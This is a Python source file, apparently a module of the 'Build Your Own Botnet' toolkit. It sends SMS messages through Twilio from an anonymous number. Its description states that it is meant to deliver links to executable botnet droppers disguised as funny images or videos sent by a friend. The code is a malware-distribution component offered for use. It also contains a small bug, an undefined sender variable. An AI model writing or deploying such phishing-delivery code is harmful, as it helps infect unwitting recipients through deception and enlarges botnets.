#!/usr/bin/python
# -*- coding: utf-8 -*-
'Phone SMS Text Message (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import Queue
import urllib

# packages
import twilio

# utilities
import util

# globals
command = True
results = Queue.Queue()
packages = ['twilio']
platforms = ['win32','linux2','darwin']
results = {}
usage = 'phone <call/sms> [option=value, ...]'
description = """ 
Use an anonymous online phone number to send an SMS text message 
containing download links to executable client droppers disguised 
as a link to a funny image/video on Imgur/YouTUbe sent from a friend
"""

# main
def run(message=None, number=None, sid=None, token=None):
    try:
        if 'twilio' in globals():
            global twilio
            phone_number = '+{}'.format(str().join([i for i in str(number) if str(i).isdigit()]))
            cli = twilio.rest.Client(sid, token)
            msg = cli.api.account.messages.create(to=phone_number, from_=phone, body=message)
            return "SUCCESS: text message sent to {}".format(phone_number)
        else:
            raise ImportError("missing package 'twilio' is required for module 'phone'")
    except Exception as e:
        return "{} error: {}".format(run.func_name, str(e))

